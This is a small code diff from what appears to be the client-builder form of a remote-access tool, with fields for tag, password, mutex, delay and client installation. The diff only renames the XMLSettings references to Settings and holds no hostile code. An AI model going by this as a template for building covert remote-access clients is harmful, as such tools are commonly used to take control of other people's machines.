@@ -30,7 +30,7 @@ namespace xServer.Forms
                 _hosts.Add(host);
             lstHosts.DataSource = new BindingSource(_hosts, null);
             txtTag.Text = profile.ReadValueSafe("Tag", "Office04");
-            txtPassword.Text = profile.ReadValueSafe("Password", XMLSettings.Password);
+            txtPassword.Text = profile.ReadValueSafe("Password", Settings.Password);
             txtDelay.Text = profile.ReadValueSafe("Delay", "5000");
             txtMutex.Text = profile.ReadValueSafe("Mutex", FormatHelper.GenerateMutex());
             chkInstall.Checked = bool.Parse(profile.ReadValueSafe("InstallClient", "False"));
@@ -86,7 +86,7 @@ namespace xServer.Forms
         {
             LoadProfile("Default");
 
-            txtPort.Text = XMLSettings.ListenPort.ToString();
+            txtPort.Text = Settings.ListenPort.ToString();
 
             UpdateControlStates();
 
